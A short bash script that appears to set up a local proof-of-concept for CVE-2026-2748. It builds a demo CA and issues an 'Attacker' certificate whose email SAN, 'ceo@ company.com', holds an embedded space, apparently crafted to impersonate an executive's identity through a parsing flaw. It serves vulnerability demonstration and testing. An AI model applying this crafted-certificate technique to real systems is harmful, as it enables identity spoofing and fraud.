#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
OUT="$ROOT/demo_out"
mkdir -p "$OUT"

openssl req -x509 -newkey rsa:2048 \
  -keyout "$OUT/ca.key" -out "$OUT/ca.crt" \
  -days 365 -nodes -subj "/CN=CVE-2026-2748 Demo CA"

openssl req -newkey rsa:2048 \
  -keyout "$OUT/attacker.key" -out "$OUT/attacker.csr" -nodes \
  -subj "/CN=Attacker" \
  -addext "subjectAltName=email:ceo@ company.com"

# This command signs the attacker's certificate signing request (attacker.csr) with the demo CA's key (ca.key) and certificate (ca.crt), issuing a new certificate (attacker.crt) valid for 365 days and copying all requested certificate extensions (like SAN) from the CSR. This simulates a CA issuing a certificate to the attacker with the desired properties.
openssl x509 -req -in "$OUT/attacker.csr" \
  -CA "$OUT/ca.crt" -CAkey "$OUT/ca.key" \
  -CAserial "$OUT/ca.srl" -CAcreateserial \
  -out "$OUT/attacker.crt" -days 365 \
  -copy_extensions copy

rm -f "$OUT/attacker.csr"
